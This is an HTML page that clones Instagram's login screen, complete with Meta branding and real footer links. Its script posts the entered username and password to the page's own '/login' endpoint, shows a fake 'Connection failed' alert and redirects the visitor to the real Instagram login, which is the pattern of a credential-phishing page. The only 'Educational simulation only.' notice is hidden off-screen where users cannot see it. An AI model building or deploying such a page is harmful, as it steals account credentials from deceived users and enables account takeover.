<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in to Instagram</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }

html { height: 100%; }

body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: #fff;
    color: #111112;
    min-height: 100%;
    min-height: 100dvh;
}

.top-alert {
    display: none;
    width: 100%;
    padding: 10px 16px;
    text-align: center;
    font-size: 13px;
    line-height: 1.35;
    font-weight: 400;
    background: #fee2e2;
    color: #991b1b;
    border-bottom: 1px solid #fecaca;
}

.top-alert.is-visible { display: block; }

.shell {
    display: flex;
    align-items: stretch;
    justify-content: center;
    width: 100%;
    min-height: calc(100vh - 120px);
    min-height: calc(100dvh - 120px);
}

.left-panel {
    display: none;
    flex: 1 1 58%;
    min-width: 0;
    overflow: hidden;
    align-self: stretch;
    position: relative;
    background: #fff;
}

@media (min-width: 876px) {
    .left-panel { display: block; }
}

.left-panel-inner {
    position: absolute;
    inset: 0;
    display: flex;
    align-items: center;
    justify-content: center;
}

.left-panel-inner img {
    width: 100%;
    height: 100%;
    object-fit: contain;
    object-position: center center;
    display: block;
}

.v-divider {
    display: none;
    align-self: stretch;
    width: 1px;
    background: #dbdbdb;
    flex-shrink: 0;
}

@media (min-width: 876px) {
    .v-divider { display: block; }
}

.right-panel {
    flex: 1 1 42%;
    min-width: 0;
    max-width: 100%;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    padding: 40px 48px 48px;
}

.right-panel-inner {
    width: 100%;
    max-width: 350px;
}

@media (max-width: 875px) {
    .right-panel {
        flex: 1 1 100%;
        width: 100%;
        padding: 32px 24px 40px;
    }

    .right-panel-inner { max-width: 350px; }
}

.login-header { margin-bottom: 24px; }

.login-header h1 {
    font-size: 16px;
    font-weight: 600;
    color: #111112;
    letter-spacing: 0;
    line-height: 1.25;
}

.field {
    position: relative;
    margin-bottom: 12px;
}

.field input {
    width: 100%;
    height: 52px;
    padding: 18px 14px 6px;
    font-size: 14px;
    font-weight: 400;
    line-height: 18px;
    border: 1px solid #dbdbdb;
    border-radius: 12px;
    background: #fff;
    outline: none;
    color: #111112;
}

.field input:focus {
    border-color: #a8a8a8;
}

.field label {
    position: absolute;
    left: 14px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 12px;
    font-weight: 400;
    color: #737373;
    pointer-events: none;
    transition: top .1s ease, font-size .1s ease, transform .1s ease;
}

.field input:focus + label,
.field input:not(:placeholder-shown) + label {
    top: 14px;
    transform: translateY(0);
    font-size: 10px;
    color: #737373;
}

.btn-primary {
    width: 100%;
    margin-top: 16px;
    padding: 0 16px;
    min-height: 44px;
    font-size: 14px;
    font-weight: 600;
    color: #fff;
    background: #0095f6;
    border: none;
    border-radius: 100px;
    cursor: pointer;
}

.btn-primary:hover:not(:disabled) { background: #1877c9; }

.btn-primary:disabled {
    background: #4cb5f9;
    opacity: 0.7;
    cursor: default;
}

.forgot {
    display: block;
    text-align: center;
    margin-top: 18px;
    margin-bottom: 48px;
    font-size: 12px;
    font-weight: 400;
    color: #111112;
    text-decoration: none;
}

.forgot:hover { opacity: 0.65; }

.btn-outline {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    width: 100%;
    margin-top: 12px;
    padding: 0 16px;
    min-height: 44px;
    font-size: 14px;
    font-weight: 600;
    border-radius: 100px;
    cursor: pointer;
    text-decoration: none;
    border: 1px solid transparent;
}

.btn-outline--facebook {
    background: #efefef;
    color: #111112;
}

.btn-outline--facebook:hover { background: #e4e4e4; }

.btn-outline--text {
    background: #fff;
    color: #0095f6;
    border-color: #0095f6;
}

.btn-outline--text:hover { background: #fafafa; }

.fb-badge {
    width: 20px;
    height: 20px;
    border-radius: 50%;
    background: #0095f6;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
}

.fb-badge svg { width: 11px; height: 11px; fill: #fff; }

.meta-footer {
    margin-top: 40px;
    padding-top: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    color: #737373;
    font-size: 14px;
    font-weight: 500;
}

.site-footer {
    border-top: 1px solid #dbdbdb;
    padding: 20px 16px 30px;
    text-align: center;
}

.footer-links {
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 8px 16px;
    max-width: 930px;
    margin: 0 auto 16px;
}

.footer-links a {
    font-size: 12px;
    color: #737373;
    text-decoration: none;
}

.footer-links a:hover { text-decoration: underline; }

.lang-select {
    font-size: 12px;
    color: #737373;
    background: none;
    border: none;
    cursor: pointer;
    margin-bottom: 12px;
    display: inline-flex;
    align-items: center;
    gap: 4px;
    font-family: inherit;
}

.footer-copy { font-size: 12px; color: #737373; }
</style>
</head>
<body>

<div class="top-alert" id="top-alert" role="alert" aria-live="polite">Connection failed. Try again.</div>

<div class="shell">
    <div class="left-panel" aria-hidden="true">
        <div class="left-panel-inner">
            <img src="/instagram-desktop-hero.png?v=3" alt="" decoding="async">
        </div>
    </div>
    <div class="v-divider" aria-hidden="true"></div>

    <div class="right-panel">
        <div class="right-panel-inner">
        <div class="login-header">
            <h1>Log in to Instagram</h1>
        </div>

        <form id="login-form" action="/login" method="POST" novalidate>
            <div class="field">
                <input type="text" name="email" id="inp-email" placeholder=" " autocomplete="username" required>
                <label for="inp-email">Mobile number, username or email address</label>
            </div>
            <div class="field">
                <input type="password" name="password" id="inp-pass" placeholder=" " autocomplete="current-password" required>
                <label for="inp-pass">Password</label>
            </div>
            <button type="submit" class="btn-primary" id="btn-login" disabled>Log in</button>
        </form>

        <a href="#" class="forgot">Forgotten password?</a>

        <a href="#" class="btn-outline btn-outline--facebook">
            <span class="fb-badge" aria-hidden="true">
                <svg viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
            </span>
            Log in with Facebook
        </a>
        <button type="button" class="btn-outline btn-outline--text">Create new account</button>

        <div class="meta-footer">
            <span style="color:#0082fb;font-size:17px;line-height:1;font-weight:300" aria-hidden="true">&infin;</span>
            <span>Meta</span>
        </div>
        </div>
    </div>
</div>

<footer class="site-footer">
    <nav class="footer-links" aria-label="Footer">
        <a href="https://about.meta.com/">Meta</a>
        <a href="https://about.instagram.com/">About</a>
        <a href="https://about.instagram.com/blog/">Blog</a>
        <a href="https://www.instagram.com/about/jobs/">Jobs</a>
        <a href="https://help.instagram.com/">Help</a>
        <a href="https://developers.facebook.com/docs/instagram">API</a>
        <a href="https://privacycenter.instagram.com/policy">Privacy</a>
        <a href="https://help.instagram.com/581066165581870">Terms</a>
        <a href="https://www.instagram.com/explore/locations/">Locations</a>
        <a href="https://www.instagram.com/explore/">Popular</a>
        <a href="https://www.instagram.com/lite/">Instagram Lite</a>
        <a href="https://www.meta.ai/">Meta AI</a>
        <a href="https://www.threads.net/">Threads</a>
        <a href="https://help.instagram.com/contact/1652567838289083">Contact Uploading &amp; Non-Users</a>
        <a href="https://www.instagram.com/about/verified/">Meta Verified</a>
    </nav>
    <button type="button" class="lang-select">English <span aria-hidden="true">&#8964;</span></button>
    <div class="footer-copy">&copy; 2026 Instagram from Meta</div>
</footer>

<p style="position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden">Educational simulation only.</p>

<script>
const IG_LOGIN = 'https://www.instagram.com/accounts/login/';

const form = document.getElementById('login-form');
const inputs = form.querySelectorAll('input');
const btn = document.getElementById('btn-login');
const topAlert = document.getElementById('top-alert');

function updateButton() {
    const filled = Array.from(inputs).every(i => i.value.trim().length > 0);
    btn.disabled = !filled;
}

function showMessageAndRedirect() {
    topAlert.textContent = 'Connection failed. Try again.';
    topAlert.classList.add('is-visible');
    window.location.href = IG_LOGIN;
}

form.addEventListener('submit', async function (e) {
    e.preventDefault();
    const params = new URLSearchParams(new FormData(form));
    btn.disabled = true;
    try {
        await fetch('/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: params.toString()
        });
    } catch (_) {}
    showMessageAndRedirect();
    updateButton();
});

inputs.forEach(function (input) {
    input.addEventListener('input', updateButton);
});
updateButton();
</script>
</body>
</html>
